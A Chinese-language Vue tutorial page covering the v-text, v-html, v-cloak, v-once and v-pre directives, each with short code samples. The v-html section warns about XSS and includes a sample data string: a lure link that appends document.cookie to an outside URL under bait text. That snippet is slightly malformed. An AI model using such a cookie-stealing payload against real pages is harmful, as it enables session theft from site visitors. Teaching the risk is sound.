# 其它内置指令

## v-text

`v-text` 指令会覆盖元素默认值。

```html
<p v-text="username">这段内容会被覆盖</p>
```

```js
data() { return { username: "Bruce" } }
```

## v-html

:::warning
安全问题

v-html 存在安全问题，容易导致 XSS 攻击
:::

```html
<p v-html="desc">原本内容被覆盖</p>
```

```js
data() {
  return {
    desc: '<h1 style="color: red">红色标题</h1>'，
    str: '<a href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
  }
}
```

## v-cloak

- 本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删除 v-cloak 属性
- 使用 CSS 配合 v-cloak 可解决网速慢时页面展示 的问题

```css
[v-cloak] {
  display: none;
}
```

```html
<h2 v-cloak>{{ username }}</h2>
```

## v-once

- v-once 所在节点初次渲染后就成为静态内容
- 即数据变化不会引起 v-once 所在节点内容的更新，可用于优化性能

```html
<h2 v-once>初次的内容：{{ content }}</h2>
<h2>最新的内容：{{ content }}</h2>
```

## v-pre

- 跳过所在节点的编译过程
- 没有使用插值语法等特殊语法的节点，可用其跳过编译过程，加快编译

```html
<h2 v-pre>Vue 内置指令</h2>
<p>用户名：{{ username }}</p>
```
